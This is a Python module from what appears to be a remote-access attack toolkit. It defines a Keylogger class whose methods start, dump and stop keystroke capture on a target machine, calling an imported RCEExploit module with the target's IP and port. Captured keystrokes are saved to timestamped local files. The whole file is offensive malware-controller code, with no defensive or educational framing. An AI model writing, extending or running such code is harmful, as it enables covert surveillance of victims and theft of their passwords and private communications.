import os
import time
from rich.console import Console
from rce_exploit import RCEExploit

console = Console()

class Keylogger:
    @staticmethod
    def keyscan_start(ip, port):
        """Start keylogging on the target device."""
        try:
            command = "keylogger_start"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print("[bold green][Keylogger] Keylogging started successfully[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Keylogger] Failed to start keylogging: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Keylogger] Keylogging start error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def keyscan_dump(ip, port):
        """Dump recorded keystrokes."""
        try:
            command = "keylogger_dump"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success' and result['response']:
                os.makedirs("Download", exist_ok=True)
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                filename = f"Download/keylog_{timestamp}.txt"
                with open(filename, "w") as f:
                    f.write(result['response'])
                console.print(f"[bold green][Keylogger] Keystrokes saved to {filename}[/bold green]")
                return {'status': 'success', 'filename': filename}
            else:
                console.print(f"[bold red][Keylogger] Failed to dump keystrokes: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Keylogger] Keystroke dump error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def keyscan_stop(ip, port):
        """Stop keylogging on the target device."""
        try:
            command = "keylogger_stop"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print("[bold green][Keylogger] Keylogging stopped successfully[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Keylogger] Failed to stop keylogging: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Keylogger] Keylogging stop error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}
            